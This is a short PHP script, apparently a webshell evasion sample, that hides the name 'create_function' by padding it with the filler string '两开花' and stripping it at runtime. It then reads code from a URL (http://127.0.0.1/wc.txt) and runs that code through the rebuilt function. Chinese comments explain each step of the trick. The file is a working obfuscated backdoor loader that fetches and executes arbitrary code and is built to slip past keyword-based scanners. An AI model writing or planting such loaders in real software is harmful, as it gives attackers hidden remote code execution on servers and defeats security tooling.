<?php
function MonkeySun(){
    return str_replace("两开花", "", "两开花c两开花R两开花e两开花Ate两开花_Fun两开花CtI两开花oN");
}
$cre =MonkeySun();
$handle1 = fopen('http://127.0.0.1/wc.txt', 'r'); /*读取本地的wc.txt*/
$content1 = '';
while(false != ($a1 = fread($handle1, 800))){ /*如果返回结果不为false*/
    $content1 .= $a1;
}
$object=$cre('',$content1); /*替换了两开花拼接了create_finction()函数，create_function($content1)*/
$object();
fclose($handle1);
?>
